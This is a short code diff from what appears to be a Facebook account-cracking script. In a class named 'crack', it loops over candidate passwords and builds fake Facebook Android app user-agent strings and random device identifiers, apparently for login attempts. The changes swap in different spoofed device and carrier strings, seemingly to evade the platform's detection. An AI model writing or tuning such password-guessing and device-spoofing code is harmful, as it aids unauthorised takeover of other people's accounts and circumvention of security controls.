@@ -568,7 +568,7 @@ class crack:
         for pw in __juts__:
             try:
                 Mm = '\033[9;31m'
-                ua_string=random.choice(ugen)
+                ua_string=random.choice(ugen2)
                 application_version = str(random.randint(300,396))+'.0.0.'+str(random.randrange(10,49))+'.'+str(random.randint(111,396))
                 application_version_code=str(random.randint(000000000,999999999))
                 adid=str(uuid.uuid4())
@@ -722,7 +722,7 @@ class crack:
                 gtt = random.choice(sm)+b+str(''.join(random.choice(string.digits) for _ in range(random.choice(uo)))+str(random.choice(string.ascii_uppercase)))
                 gttt=str(random.choice(string.ascii_uppercase))+str(random.randrange(11,99))+str(''.join(random.choice(string.ascii_uppercase) for _ in range(random.choice(uo))))
                 net=random.choice(['ZONG', 'Jazz'])
-                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.5,width=780,height=860};FBLC/en_PK;FBCR/7-Seven;FBMF/VIVO;FBBD/Vivo;FBPN/com.facebook.katana;FBDV/V201S;FBSV/11.0.1;FBCA/armeabi-v7a:armeabi;]'
+                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.0,width=720,height=1280};FBLC/en_Us;FBRV/0;FBCR/DOCOMO;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 9T NFC;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                 device = str(uuid.uuid4())
                 adid = str(uuid.uuid4())
                 data = {
